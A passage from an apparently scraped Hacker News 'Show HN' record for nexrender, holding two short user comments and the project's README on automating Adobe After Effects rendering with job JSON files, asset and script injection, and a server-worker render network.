splitting based on time & amount of workers New job type (partitioned), which would be excluded from some general API responses Mechanism of selecting a single node to be the \"finisher\", that would await and merge results of other jobs Possible names: @nexrender/action-merge-parent, @nexrender/action-merge-child Extend current scripting capabilities with an advanced real-time communication with the internal environment via TCP connection Define a general abstract inteface for the actions, and a general package that would contain basic funcitonality like input/output arguments, etc. Re-design networking layer, as well as server database layer, to count in cases where the jobs can be huge json objects. Create automated footage detection and asset generator Contributors Code Contributors This project exists thanks to all the people who contribute. [Contribute]. Financial Contributors Become a financial contributor and help us sustain our community. [Contribute] Individuals Organizations Support this project with your organization. Your logo will show up here with a link to your website. [Contribute] ",
          "Non-dev here. Could i use something like this to customise an existing kinetic typography AE template and churn out new videos? Also do you know any freelancers that would take on such work?",
          "Seems Like you have a solution for something I posted a few mins back as Ask HN: <a href=\"https://news.ycombinator.com/item?id=21240528\" rel=\"nofollow\">https://news.ycombinator.com/item?id=21240528</a><p>If you think your solution can work with modification and you are available for hire let me know will discuss more."
        ],
        "story_type": ["ShowHN"],
        "url": "https://github.com/inlife/nexrender",
        "comments.comment_id": [21240179, 21240749],
        "comments.comment_author": ["krmmalik", "techaddict009"],
        "comments.comment_descendants": [2, 1],
        "comments.comment_time": [
          "2019-10-13T13:12:50Z",
          "2019-10-13T15:06:58Z"
        ],
        "comments.comment_text": [
          "Non-dev here. Could i use something like this to customise an existing kinetic typography AE template and churn out new videos? Also do you know any freelancers that would take on such work?",
          "Seems Like you have a solution for something I posted a few mins back as Ask HN: <a href=\"https://news.ycombinator.com/item?id=21240528\" rel=\"nofollow\">https://news.ycombinator.com/item?id=21240528</a><p>If you think your solution can work with modification and you are available for hire let me know will discuss more."
        ],
        "id": "1d2f2a00-e5ed-4607-90da-d71227f9b936",
        "url_text": "Automate your Adobe After Effects rendering workflows. Create data-driven and template based videos. Built with love using nodejs Brought to you by @inlife and other contributors Table of contents Introduction Features How it works Alternatives Installation Usage Job Assets Actions Details Job States Programmatic Information Template rendering Footage items Fields Example Original source Example Static assets Example: Data Assets Fields Example Script Asset Fields Dynamic Parameters Supported Parameter Types Parameter Types examples String Number Array Object Null Functions Warnings Self-Invoking Functions Example Named Functions Anonymous Functions Complete functions example Examples No dynamic parameters. Dynamic variable - Array type parameter Default Dynamic Variable Keyword Parameter Example JSX Script with defaults: Example JSX Script without defaults: Network rendering Using binaries nexrender-server Description: Supported platforms: Requirements: Example nexrender-worker Description: Supported platforms: Requirements: Example Using API Tested with Additional Information Protocols Examples WSL (Windows Subsystem for Linux) Linux Mapping Windows Pathing Binary Workpath Memory Problems Development Project Values Awesome External Packages Awesome Related Projects Custom Actions Migrating from v0.x Naming Structure Assets Rendering CLI Customers Plans Contributors Code Contributors Financial Contributors Individuals Organizations Introduction nexrender is a simple, small, carefully designed application with the main goal of rendering automation for Adobe After Effects based rendering workflows. At this point in time, the project is mainly targeted at people at least somewhat comfortable with scripting or development, and that have basic knowledge of javascript language and json formats. Features data-driven, dynamic, personalized video rendering automated video management, processing, and delivery network oriented project structure, render farm highly modular nature, extensive plugin support works only in cli mode, never launches After Effects GUI application does not require licenses for Adobe After Effects on any worker machine free to use and open source How it works rendering: It uses Adobe After Effects' aerender command-line interface application. compositing: It creates a temporary folder, copies project and replaces assets with provided ones. personalization: It uses AE's expressions, scripting, and compositing (noted above). scheduling: It stores projects in a local database, managed from anywhere using http api. network: It renders project per machine, and can be used to render several projects simultaneously. farm: Can be used to render a single project on several machines via Multi-Machine Sequence. Alternatives Probably the closest (feature-wise) alternative that exists at the moment is the Dataclay's Templater bot edition. Compared to nexrender it has a rich GUI support and a number of enterprise-scale features, however, it is not free. Installation You can download binaries directly from the releases section, or install them using npm, whichever option works better for you. However, please note: the npm version of the binaries doesn't include all optional plugin packages that are covered in the usage section. If you wish to install them as well, please do so by providing each one individually: npm i -g @nexrender/cli @nexrender/action-copy @nexrender/action-encode ... Usage We will be using nexrender-cli binary for this example. It's recommended to download/install it if you haven't already. Also, check out these example/tutorial videos made by our community: \"Creating automated music video with nexrender\" by douglas prod. If using WSL check out wsl support Job A job is a single working unit in the nexrender ecosystem. It is a json document, that describes what should be done, and how it should be done. Minimal job description always should contain a pointer onto Adobe After Effects project, which is needed to be rendered, and a composition that will be used to render. The pointer is src (string) field containing a URI pointing towards specified file, followed by composition (string) field, containing the name of the composition that needs to be rendered. Note: check out supported protocols for src field. // myjob.json { \"template\": { \"src\": \"file:///users/myuser/documents/myproject.aep\", \"composition\": \"main\" } } or for remote file accessible via http // myjob.json { \"template\": { \"src\": \"http://example.com/myproject.aep\", \"composition\": \"main\" } } Submitting this data to the binary will result in start of the rendering process: $ nexrender-cli '{\"template\":{\"src\":\"file:///home/documents/myproject.aep\",\"composition\":\"main\"}}' Note: on MacOS you might need to change the permissions for downloaded file, so it would be considered as an executable. You can do it by running: $ chmod 755 nexrender-cli-macos or more conveniently using the --file option $ nexrender-cli --file myjob.json Note: its recommended to run nexrender-cli -h at least once, to read all useful information about available options. More info: @nexrender/cli Assets We've successfully rendered a static project file using nexrender, however, there is no much point doing that unless we are going to add some dynamic data into the mix. A way to implement something like that is to add an asset to our job definition: // myjob.json { \"template\": { \"src\": \"file:///d:/documents/myproject.aep\", \"composition\": \"main\" }, \"assets\": [ { \"src\": \"file:///d:/images/myimage.png\", \"type\": \"image\", \"layerName\": \"background.png\" } ] } What we've done there is we told nexrender to use a particular asset as a replacement for something that we had defined in our aep project. More specifically, when rendering is gonna happen, nexrender will copy/download this asset file, and attempt to find and replace footage entry by specified layer name. Check out: detailed information about footage items. Actions You might've noticed that unless you added --skip-cleanup flag to our command, all rendered results will be deleted, and a big warning message will be shown every time you attempt to run the nexrender-cli with our job. The reason is that we haven't defined any actions that we need to do after we finished actual rendering. Let's fix that and add a simple one, copy. // myjob.json { \"template\": { \"src\": \"http://example.com/assets/myproject.aep\", \"composition\": \"main\" }, \"assets\": [ { \"src\": \"http://example.com/assets/myimage.png\", \"type\": \"image\", \"layerName\": \"background.png\" } ], \"actions\":{ \"postrender\": [ { \"module\": \"@nexrender/action-encode\", \"preset\": \"mp4\", \"output\": \"encoded.mp4\" }, { \"module\": \"@nexrender/action-copy\", \"input\": \"encoded.mp4\", \"output\": \"d:/mydocuments/results/myresult.mp4\" } ] } } We've just added a postrender action, that will occur right after we finished rendering. A module that we described in this case, is responsible for copying result file from a temp folder to the output folder. There are multiple built-in modules within nexrender ecosystem: @nexrender/action-copy @nexrender/action-encode @nexrender/action-upload @nexrender/action-cache (list will be expanded) Every module might have his own set of fields, however, module field is always there. Also, you might've noticed that actions is an object, however, we described only one (postrender) field in it. And there are more: predownload - can be used to modify the job before the assets are downloaded postdownload - can be used to modify the job after the assets are downloaded prerender - can be used to process data/assets just before the actual render will start. Also, if you are planning on having more than one action, please note: actions are order-sensitive, that means if you put let's say some encoding action after upload, the latter one might not be able to find a file that needs to be generated by former one, since the ordering was wrong. If you have at least some experience with Node.js, you might've noticed that the module definition looks exactly like a package name. And well, yes it is. When nexrender stumbles upon a module entry, it will try to require this package from internal storage, and then if no module has been found, it will attempt to look for globally installed Node.js modules with that name. That means if you are comfortable with writing Node.js code, you can easily create your own module, and use it by providing either absolute/relative path (on a local machine), or publishing the module and installing it globally on your target machine. npm i -g my-awesome-nexrender-action And then using it: { \"actions\":{ \"postrender\": [ { \"module\": \"my-awesome-nexrender-action\", \"param1\": \"something big\", \"param2\": 15 } ] } } Also, you can checkout packages made by other contributors across the network: Details Job structure has more fields, that we haven't checked out yet. The detailed version of the structure looks like this: { \"template\": { \"src\": String, \"composition\": String, \"frameStart\": Number, \"frameEnd\": Number, \"frameIncrement\": Number, \"continueOnMissing\": Boolean, \"settingsTemplate\": String, \"outputModule\": String, \"outputExt\": String, }, \"assets\": [], \"actions\": { \"predownload\": [], \"postdownload\": [], \"prerender\": [], \"postrender\": [], }, \"onChange\": Function, \"onRenderProgress\": Function, \"onRenderError\": Function } Majority of the fields are just proxied to the aerender binary, and their descriptions and default values can be checked here. onChange is a callback which will be triggered every time the job state is changed (happens on every task change). onRenderProgress is a callback which will be triggered every time the rendering progress has changed. onRenderError is a callback which will be triggered when arender encounters an error during its runtime. So far known errors are (please contribute): Errors from nexrender.jsx - most likely issue in the assets section within the job. No comp was found with the given name. - Composition from template.composition not present in the AE file. After Effects error: file is damaged. - AE file is broken and could not be opened (caused by incomplete transfer/download) Note: Callback functions are only available via programmatic use. For more information, please refer to the source code. Job States Note: Job states are mainly used for network rendering. If you are using nexrender-cli you can skip this section. Job can have state feild (job.state) be set to one of those values: created (default) queued (when pushed to the nexrender-server) picked (when somebody picked up job on nexrender-server) started (when worker started preparing and running the job) render:setup (bunch of states that are specific to each render step) render:predownload render:download render:postdownload render:prerender render:script render:dorender render:postrender render:cleanup finished (when worker successfully finished rendering the job) error (when worker got an error at any step starting from started state) Programmatic In case you are building your own application and just need to use a rendering part, or you wanna manually trigger jobs from your code, there is a way to use nexrender programmatically: Install the @nexrender/core $ npm install @nexrender/core --save And then load it, and run it const { render } = require('@nexrender/core') const main = async () => { const result = await render(/*myJobJson*/) } main().catch(console.error); Or you can go more advanced, and provide some settings as your 2nd argument to the render function: const { render } = require('@nexrender/core') const main = async () => { const result = await render(/*myJobJson*/, { workpath: '/Users/myname/.nexrender/', binary: '/Users/mynames/Apllications/aerender', skipCleanup: true, addLicense: false, debug: true, }) } main().catch(console.error); Information The module returns 2 methods, init and render. render calls init internally, if it sees that there were some options provided to render as 2nd argument. First one is responsible for setting up the env, checking if all needed patches for AE are in place, automatically adding render-only license file for a free usage of Adobe's product (unless disabled), and a few other minor things. Second one is responsible for mainly job-related operations of the full cycle: downloading, rendering, processing, and uploading. init accepts an object, containing additional options: workpath - string, manually set path to working directory where project folder will be created, overrides default one in system temp folder binary - string, manually set path pointing to the aerender(.exe) binary, overrides auto found one debug - boolean, enables or disables debug mode, false by default skipCleanup - boolean, providing true will prevent nexrender from removing the temp folder with project (false by default) skipRender - boolean, providing true will prevent nexrender from running actual rendering, might be useful if you only want to call scripts multiFrames - boolean, providing true will attmpt to use aerender's built-in feature of multi frame rendering (false by default) reuse - boolean, false by default, (from Adobe site): Reuse the currently running instance of After Effects (if found) to perform the render. When an already running instance is used, aerender saves preferences to disk when rendering has completed, but does not quit After Effects. If this argument is not used, aerender starts a new instance of After Effects, even if one is already running. It quits that instance when rendering has completed, and does not save preferences. maxMemoryPercent - integer, undefined by default, check original documentation for more info imageCachePercent - integer, undefined by default, check original documentation for more info addLicense - boolean, providing false will disable ae_render_only_node.txt license file auto-creation (true by default) forceCommandLinePatch - boolean, providing true will force patch re-installation wslMap - String, set WSL drive map, check wsl for more info More info: @nexrender/core Using the ${workPath} mask in @nexrender/action-encode The output of @nexrender/action-encode is always prepended by the working path of the job, so you don't have to guess paths. However if you want to use the working path of the job for something else such as encoding in multiple bitrates it is necessary to use the ${workPath} mask. This is especially useful for HLS encoding //HLS encoding { \"module\": \"@nexrender/action-encode\", \"output\": \"encoded_playlist_%v.m3u8\", \"params\": { \"-acodec\": \"aac\", \"-vcodec\": \"libx264\", \"-pix_fmt\": \"yuv420p\", \"-map\": [ \"0:0\", \"0:0\", \"0:0\" ], \"-b:v:0\": \"2000k\", \"-b:v:1\": \"1000k\", \"-b:v:2\": \"500k\", \"-f\": \"hls\", \"-hls_time\": \"10\", \"-hls_list_size\": \"0\", \"-var_stream_map\": \"v:0,name:high v:1,name:medium v:2,name:low\", \"-master_pl_name\": \"master.m3u8\", \"-hls_segment_filename\": \"${workPath}\\\\encoded%d_%v.ts\" } } The -hls_segment_filename flag requires the absolute paths or else it would save on the working path of the nexrender application hence the use of ${workPath} Template rendering One of the main benefits of using nexrender is an ability to render projects using data other than what has been used while the project has been created. Data means any sort of source/footage material, it can be images, audio tracks, video clips, text strings, values for colors/positions, even dynamic animations using expressions. All of those things can be replaced for every job without even opening a project file or starting After Effects. Note: Also this process can be called in other ways: templated, data-driven or dynamic video generation. This approach allows you to create a .aep file once, and then reuse it for as many target results as you need to. However, what is needed to get started? Footage items Footage item replacement is what briefly has been covered in the Job section of this document. The idea is quite simple, you describe which asset will replace existing described footage item in a specific layer, by specifying src, and one of the layerName or layerIndex options. Fields src: string, a URI pointer to the specific resource, check out supported protocols type: string, for footage items, is one of (image, audio, video) layerName: string, target layer name in the After Effects project layerIndex: integer, can be used instead of layerName to select a layer by providing an index, starting from 1 (default behavior of AE jsx scripting env) composition: string, composition where the layer is, useful for searching layer in specific compositions. If none is provided, it uses the wildcard composition \"*\", that will result in a wildcard composition matching, and will apply this data to every matching layer in every matching composition. If you want to search in a nested composition you can provide a path to that composition using \"->\" delimiter. For example, \"FULL_HD->intro->logo comp\" matches a composition named logo comp that is used in composition intro which in turn is used in composition FULL_HD. Note, that FULL_HD doesn't have to be the root composition. Make sure to specify a composition name, not a layer name. name: string, and optional filename that the asset will be saved as, if not provided the layerName or the basename of the file will be used extension: string, an optional extension to be added to the filename before it is sent for rendering. This is because After Effects expects the file extension to match the content type of the file. If none is provided, the filename will be unchanged. useOriginal: boolean, an optional feature specific to the file:// protocol, that prevents nexrender from copying an asset to local temp folder, and use original instead Specified asset from src field will be downloaded/copied to the working directory, and just before rendering will happen, a footage item with specified layerName or layerIndex in the original project will be replaced with the freshly downloaded asset. This way you (if you are using network rendering) you can not only deliver assets to the target platform but also dynamically replace them. Note: if layerName is used for footage file asset, it should always contain the extension in the name as well. Example { \"assets\": [ { \"src\": \"https://example.com/assets/image.jpg\", \"type\": \"image\", \"layerName\": \"MyNicePicture.jpg\" }, { \"src\": \"https://example.com/assets/jpeg-without-extension\", \"type\": \"image\", \"layerName\": \"MyOtherNicePicture.jpg\", \"extension\": \"jpg\" }, { \"src\": \"file:///home/assets/audio.mp3\", \"type\": \"audio\", \"name\": \"music.mp3\", \"layerIndex\": 15 } ] } Original source For file protocol based assets (assets coming from local filesystem/shared network), you can provide additional option useOriginal, that would force nexrender to use an original file rather than creating a local copy inside of the temp rendering folder. That could be useful for large asset files, that would otherwise take a long time to copy. Example { \"assets\": [ { \"src\": \"file:///D:/assets/MyBigAsset.wav\", \"type\": \"audio\", \"useOriginal\": true, \"layerIndex\": 15 } ] } Static assets There is also a plain asset type that allows you to simply provide an src, and that file will be downloaded in the folder with the project. No additional automated actions will happen with that asset, unless you manually use scripting to do something with those. Might be useful for some static data-based injections, or some other use cases. Example: { \"assets\": [ { \"src\": \"http://example.com/assets/something.json\", \"type\": \"static\" }, { \"src\": \"http://example.com/assets/something_else.csv\", \"name\": \"mydata.csv\", \"type\": \"static\" } ] } Data Assets The second important point for the dynamic data-driven video generation is the ability to replace/change/modify non-footage data in the project. To do that a special asset of type data can be used. Fields type: string, for data items, is always data layerName: string, target layer name in the After Effects project layerIndex: integer, can be used instead of layerName to select a layer by providing an index, starting from 1 (default behavior of AE jsx scripting env) property: string, indicates which layer property you want to change value: mixed, optional, indicates which value you want to be set to a specified property expression: string, optional, allows you to specify an expression that can be executed every frame to calculate the value composition: string, composition where the layer is, useful for searching layer in specific compositions. If none is provided, it uses the wildcard composition \"*\", that will result in a wildcard composition matching, and will apply this data to every matching layer in every matching composition. If you want to search in a nested composition you can provide a path to that composition using \"->\" delimiter. For example, \"FULL_HD->intro->logo comp\" matches a composition named logo comp that is used in composition intro which in turn is used in composition FULL_HD. Note, that FULL_HD doesn't have to be the root composition. Make sure to specify a composition name, not a layer name. Since both value and expression are optional you can provide them in any combination, depending on the effect you want to achieve. Providing value will set the exact value for the property right after execution, and providing an expression will make sure it will be evaluated every frame. Note: If you are not sure what expressions are, and how to use them, please refer to this page And if you are not sure what is a property and where to get it you can refer to this image: Property Example As you can see there are a few Property Groups like Text, Masks, Transform that include actual properties. Those properties are what can be used as a target. In case you need to change some deep properties, like show on this image: You can do that by providing the property name using a dot . separator. (Example: \"Effects.Skin_Color.Color\") In case your property already has . in the name, and you are sure it will lead to a collision, while parsing, you can also use arrow symbol -> instead. You can also change the deeper attributes of properties, for example the font of a text layer using \"Source Text.font\" or the font size by \"Source Text.fontSize\". Example { \"assets\": [ { \"type\": \"data\", \"layerName\": \"MyNicePicture.jpg\", \"property\": \"Position\", \"value\": [500, 100] }, { \"type\": \"data\", \"layerName\": \"my text field\", \"property\": \"Source Text\", \"expression\": \"time > 100 ? 'Bye bye' : 'Hello world'\" }, { \"type\": \"data\", \"layerName\": \"my text field\", \"property\": \"Source Text.font\", \"value\": \"Arial-BoldItalicMT\" }, { \"type\": \"data\", \"layerName\": \"background\", \"property\": \"Effects.Skin_Color.Color\", \"value\": [1, 0, 0] }, { \"type\": \"data\", \"layerIndex\": 15, \"property\": \"Scale\", \"expression\": \"[time * 0.1, time * 0.1]\" }, ] } Note: any error in expression will prevent the project from rendering. Make sure to read error messages reported by After Effects binary carefully. Script Asset NEW: Now you can pass arguments to JSX dynamically! Read below for more information The last and the most complex and yet the most powerful is an ability to execute custom jsx scripts just before the rendering will start. This approach allows you to do pretty much anything that is allowed for scripting, like creating/removing layers, adding new elements, restructuring the whole composition, and probably much more. Now, actual complexity happens only from the side of actual scripting, you need to have some basic knowledge of ExtendScript Toolkit, and from the nexrender side everything is quite simple. You only need to provide an src pointing towards script resource and set up proper type. Fields src: string, a URI pointer to the specific resource, check out supported protocols type: string, for script items, is always script keyword: (optional) string, name for the configuration object holding all the dynamically injected parameters. Defaults to NX parameters: (optional) object, object where all the dynamically injected parameters are defined. Variables not defined here but used in the script are null by default. globalDefaultValue (optional) any, The default value of any found unknown or undefined value for any given keyword child object keyis null. However this can be changed by setting this parameter to something. You should be careful on which default to set, it is suggested to leave it as it is and check for null values in your JSX code. Dynamic Parameters With dynamic parameters you can set a parameter in your Job declaration to be used on a JSX Script! Each parameter object must have the following: key (required) : The key of the variable. Example: Key = dog => NX.dog. value (required) : The target value for the variable. Example: Key = dog, Value = \"doggo\" => NX.dog = \"doggo\". See Supported Parameter Types. Supported Parameter Types We currently support all standard JSON Parameters with the addition of javascript functions, which can be named, anonymous or self-invoking. string number array object null (default) functions Parameter Types examples String \"parameters\" : [ { \"key\" : \"fullName\", \"value\": \"John Doe\" } ] Number \"parameters\" : [ { \"key\" : \"orangeAmount\", \"value\": 37 } ] Array \"parameters\" : [ { \"key\" : \"officesList\", \"value\": [\"Santiago\", \"London\", \"Paris\", \"Kyoto\", \"Hong-Kong\"] } ] Object \"parameters\" : [ { \"key\" : \"carDetails\", \"value\": { \"model\" : \"Tesla Model S\", \"maxBatteryLife\" : 500000, \"color\" : \"vermilion\" } } ] Null This is the default value for parameters used on any given JSX script that are not initializated. \"parameters\" : [ { \"key\" : \"carDetails\" } ] NX.get(\"carDetails\") will be equal to null. Functions Functions are useful if you need some dynamic calculation of specific values. You can use them in conjuction with other dynamic parameters as well. Currently we support Self-invoking Functions, Named Functions and Anonymous Functions. After Effects ExtendedScript does not support arrow functions at the moment (cc 2020). Warnings You must only use one function per parameter; If there's more than one function defined in the parameter value the job will crash due to limitations in function detection and parsing. Use well-formed functions and be aware of the computational weight of your functions. Malformed functions will cause the script to fail and subsequently the job to crash. Self-Invoking Functions Example Self-invoking functions are useful to use in a string concatenation or places where you need a value result from the function and not to redeclare it. \"parameters\" : [ { \"key\" : \"twoPlusTwo\", \"value\": \"(function() { return 1+1; })()\" } ] The above function could be use in a string concatenation such as alert(\"Miss what's the mathematical operation required to compute the number\" + NX.get(\"twoPlusTwo\") + \" ?\"); // A typical second grade question. \"parameters\" : [ { \"key\" : \"invitees\", \"value\": [\"Steve\", \"Natasha\", \"Tony\", \"Bruce\", \"Wanda\", \"Thor\", \"Peter\", \"Clint\" ] }, { \"key\" : \"eventInvitation\", \"value\": \"(function (venue) { alert( 'This years\\' Avengers Gala is on the prestigious ' + venue.name + ' located at ' + venue.location + '. Our special guests ' + NX.get('invitees').value.map(function (a, i) { return (i == NX.get('invitees').value.length - 1) ? ' and ' + a + ' (whoever that is)' : a + ', '; }).join('') + ' going to be present for the ceremony!'); })({ name: NX.arg('venue'), location: NX.arg('location') })\", \"arguments\": [ { \"key\" : \"venue\", \"value\" : \"Smithsonian Museum of Natural History\" }, { \"key\" : \"location\", \"value\": \"10th St. & Constitution Ave.\" } ] } ] This convoluted function would return a lovely invitation string to an event using a dynamic parameter set on the json Job, as well as having additional required parameters with their defaults and could be used as follows: alert(NX.get(\"eventInvitation\")); // Output: /* This years' Avengers Gala is on the prestigious Smithsonian Museum of Natural History located at 10th St. & Constitution Ave. Our special guests Steve, Natasha,Tony, Wanda, Thor, Peter and Clint (whoever that is) are going to be present for the ceremony! */ Named Functions \"parameters\" : [ { \"key\" : \"sum\", \"value\": \"function namedSumFunction(a, b) { return a + b; }\" } ] var result = NX.call(\"sum\", [400, 20]); // 420 Note that the usage of the named method is sum and not namedSumFunction due to JS' hoisting, so named functions are implemented and used the same was as anonymous functions. Anonymous Functions \"parameters\" : [ { \"key\" : \"sumValues\", \"value\": \"function (a, b) { return a + b; }\" } ] var result = NX.call(\"sumValues\", [400, 20]); // 420 Complete functions example { \"template\": { \"src\": \"file:///template.aep\", \"composition\": \"BLANK_COMP\" }, \"assets\": [ { \"src\": \"file:///sampleParamInjection.jsx\", \"type\": \"script\", \"parameters\": [ { \"type\": \"array\", \"key\" : \"dogs\", \"value\": [ \"Captain Sparkles\", \"Summer\", \"Neptune\"] }, { \"type\" : \"number\", \"key\" : \"anAmount\" }, { \"type\": \"function\", \"key\": \"getDogsCount\", \"value\" : \"function() { return NX.get('dogs').length; }\" }, { \"type\": \"function\", \"key\": \"exampleFn\", \"value\": \"function ( parameter ) { return parameter; }\" }, { \"type\" : \"function\", \"key\" : \"dogCount\", \"value\" : \"(function(length) { return length })(NX.arg('dogCount'))\", \"arguments\": [ { \"key\" : \"dogCount\", \"value\": [\"NX.call('exampleFn', [NX.call('getDogsCount') + NX.get('anAmount')])\"] } ] } ] } ] } Examples No dynamic parameters. { \"assets\": [ { \"src\": \"http://example.com/scripts/myscript.jsx\", \"type\": \"script\" } ] } Dynamic variable - Array type parameter \"assets\": [ { \"src\": \"file:///C:/sample/sampleParamInjection.jsx\", \"type\": \"script\", \"parameters\": [ { \"key\": \"name\", \"value\": \"Dilip\" } ] } ] Default Dynamic Variable Keyword Parameter The value could be a variable or a function, but beware that there is no sanitization nor validation so if the input is malformed it could crash the job By default the keyword is set to NX, so you would call your variables or methods like NX.get(\"foo\") or NX.call(\"bar\", [\"sampleStringParameter\"]). To change this keyword simply set \"keyword\" as shown below: \"assets\": [ { \"src\": \"file:///C:/sample/sampleParamInjection.jsx\", \"type\": \"script\", \"keyword\": \"_settings\", \"parameters\": [ { \"key\": \"name\", \"value\": \"Dilip\" } ] } ] This way instead of NX.get(\"foo\") it would be _settings.get(\"foo\") All dynamic parameters used in the script should have a JSX default Example JSX Script with defaults: { return \"Hello \" + NX.get(\"name\") || \"John\"; } The code above will output either: \"Hello John\" if no parameter defined on the JSON parameters array or this parameter is missing. \"Hello NAME\" if parameter name has a value of NAME on the JSON parameters array. Example JSX Script without defaults: { // The code below will crash if it's executed directly in After Effects. See documentation on how to enable cross environment fault tolerance. return \"There are \" + NX.get(\"beerBottlesAmount\") + \" beer bottles ready to drink!\" } The code above will output either: \"There are null beer bottles ready to drink!\" if no parameter defined on the JSON parameters array. \"There are 20 beer bottles ready to drink!\" if parameter beerBottlesAmount has a value of 20 on the JSON parameters array. But don't you worry about missing any of the examples above; If you use a variable in your JSX with the default keyword and no initialization whatsoever, the console will output a handy initialization code snippet for both JSON and JSX for you to copy and modify with your own values! That pretty much covers basics of templated rendering. Network rendering We've covered basics on how to set up a minimal rendering flow using local cli machine rendering. Now, what if you want to start rendering on a remote machine, to reduce load while you are working on your local machine. Or maybe you need to render so many videos at once, that you will require a whole fleet of nodes running on some cloud cluster. With nexrender, you can quite quickly and easily spin up your own rendering cluster. Using binaries You can download compiled versions of binaries directly from the releases section, or install them using npm, whichever option works better for you. nexrender-server Description: A CLI application which is responsible for job management, worker node cooperation, communications with the nexrender-worker instances, and serves mainly as a producer in the nexrender network model. Technically speaking its a very tiny HTTP server running with a minimal version of REST API. Optional support for external databases can be added (like Redis, MongoDB, MySQL, etc.), with some of them already in place. Please check modules for more info. Supported platforms: Windows, macOS, Linux Requirements: None Example $ nexrender-server \\ --port=3050 \\ --secret=myapisecret More info: @nexrender/server nexrender-worker Description: A CLI application which is responsible mainly for actual job processing and rendering, communication with the nexrender-server, and serves mainly as a consumer in the nexrender network model. Supported platforms: Windows, macOS Requirements: Installed licensed/trial version of Adobe After Effects Example $ nexrender-worker \\ --host=https://my.server.com:3050 \\ --secret=myapisecret Note: its recommended to run nexrender-worker -h at least once, to read all useful information about available options. More info: @nexrender/worker Using API Now, after you've loaded up your worker and server nodes, they will need some jobs to be submitted to the server to start actual rendering. There are 2 main ways to do that, first one - just send a direct POST request to add a job to the server. curl \\ --request POST \\ --header \"nexrender-secret: myapisecret\" \\ --header \"content-type: application/json\" \\ --data '{\"template\":{\"src\":\"http://my.server.com/assets/project.aep\",\"composition\":\"main\"}}' \\ http://my.server.com:3050/api/v1/jobs Another option is to use already created API module for js: npm install @nexrender/api --save const { createClient } = require('@nexrender/api') const client = createClient({ host: 'http://my.server.com:3050', secret: 'myapisecret', }) const main = async () => { const result = await client.addJob({ template: { src: 'http://my.server.com/assets/project.aep', composition: 'main', } }) result.on('created', job => console.log('project has been created')) result.on('started', job => console.log('project rendering started')) result.on('progress', (job, percents) => console.log('project is at: ' + percents + '%')) result.on('finished', job => console.log('project rendering finished')) result.on('error', err => console.log('project rendering error', err)) } main().catch(console.error); More info: @nexrender/api Tested with Current software was successfully tested on: Adobe After Effects CS 5.5 [OS X 10.14.2] Adobe After Effects CC (version 12.1.168) [OS X 10.11.2, Windows 10 64bit] Adobe After Effects CC 2015 (version 13.6.0) [OS X 10.11.2] Adobe After Effects CC 2018.3 [Windows 2012 Server R2 Datacenter] Adobe After Effects CC 2019 [OS X 10.14.2, Windows Server 2019 (AWS)] Additional Information Protocols src field is a URI string, that describes path pointing to the specific resource. It supports a few different protocols: Built-in: file:// - file on a local file system, may include environment variables identified by a preceding $ sign (possibly a pipe? need testing) http:// - file on remote http server https:// - file on remote http server served via https data:// - URI encoded data, can be a base64 or plain text External: gs:// - @nexrender/provider-gs - Google Cloud Storage provider s3:// - @nexrender/provider-s3 - Amazon S3 provider ftp:// - @nexrender/provider-ftp - Node.js FTP provider (other protocols will be added there) Examples Here are some examples of src paths: file:///home/assets/image.jpg file:///d:/projects/project.aep file://$ENVIRONMENT_VARIABLE/image.jpg http://somehost.com:8080/assets/image.jpg?key=foobar https://123.123.123.123/video.mp4 data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAUAAAAFCAYAAACNbyblAAAAHElEQVQI12P4//8/w38GIAXDIBKE0DHxgljNBAAO9TXL0Y4OHwAAAABJRU5ErkJggg== data:text/plain;charset=UTF-8,some%20data:1234,5678 WSL If running WSL (Windows Subsystem for Linux) you will need to configure your project a bit differently in order for it to render correctly. Linux Mapping You will need to pass in which drive letter Linux is mapped to in Windows. This is the Drive Letter in which you can access your Linux file system from Windows. Note: Drive mapping is setup when configuring WSL You can do this through the CLI like so assuming Linux is mapped to Z. $ nexrender-cli -f mywsljob.json -m \"Z\" or $ nexrender-cli -f mywsljob.json -wsl-map \"Z\" And you can do this Programmatically like const { render } = require('@nexrender/core') const main = async () => { const result = await render(/*myWSLJobJson*/, { skipCleanup: true, addLicense: false, debug: true, wslMap: \"Z\" }) } main().catch(console.error); Windows Pathing When referencing windows file system you will need to use /mnt/[DRIVE YOU WANT TO ACCESS]/[PATH TO YOUR FILE]. like so /mnt/d/Downloads/nexrender-boilerplate-master/assets/nm.png CLI Example nexrender-cli -f mywsljob.json -m \"Z\" -w /mnt/d/Downloads/tmp/nexrender Job Example { \"template\": { \"src\": \"file:///mnt/d/Downloads/nexrender-boilerplate-master/assets/nm05ae12.aepx\", \"composition\": \"main\", }, \"assets\": [ { \"src\": \"file:///mnt/d/Downloads/nexrender-boilerplate-master/assets/2016-aug-deep.jpg\", \"type\": \"image\", \"layerName\": \"background.jpg\" } ], \"actions\": { \"postrender\": [ { \"module\": \"@nexrender/action-encode\", \"output\": \"output.mp4\", \"preset\": \"mp4\" } ] } } Note: nexrender does not currently support custom root pathing WSL Binary If After Effects is installed into the default location nexrender should auto detected it. Otherwise you will need to provide its location following the Windows Pathing Guide. Example for if you installed After Effect onto your D drive. nexrender-cli -f mywsljob.json -b \"/mnt/d/Program Files/Adobe/Adobe After Effects 2020/Support Files/aerender.exe\" WSL Workpath By default nexrender will use your Linux /tmp folder to render out the jobs. We suggest changing this to a secondary drive as rendering can eat up disk space causing an issue where WSL does no release disk space back to Windows. Example under Windows Pathing Guide. Github Issue: WSL 2 should automatically release disk space back to the host OS WSL Memory It's also suggested that you create a .wslconfig file in your Windows user folder and limit the memory that can be used by WSL. Otherwise your rendering will crash on large projects. .wslconfig Example [wsl2] memory=4GB swap=0 localhostForwarding=true Github Issue: WSL 2 consumes massive amounts of RAM and doesn't return it Problems There might be a lot of problems creeping around, since this tool works as an intermediary and coordinator for a bunch of existing complex technologies, problems is something inescapable. However, we will try our best to expand and keep this section up to date with all possible caveats and solutions for those problems. macOS access: there might be issues with nexrender accessing the aerender binary within the Adobe library folder, or accessing /tmp folders. For more details refer to https://github.com/inlife/nexrender/issues/534 Development If you wish to contribute by taking an active part in development, you might need this basic tutorial on how to get started: clone the repo run npm install run npm start The last command will run lerna bootstrap action to setup dependencies for all packages listed in the packages/ folder, and link them together accordingly to their dependency relations. After that, you can start the usual development flow of writing code and testing it with npm start in a specific package. Why this multi-package structure has been chosen? It seemed like a much smarter and easier way to achieve a few things: separation of concerns, every module is responsible for a limited set of things modularity and plugin-friendly nature, which allows external packages to be used instead, or alongside built-in 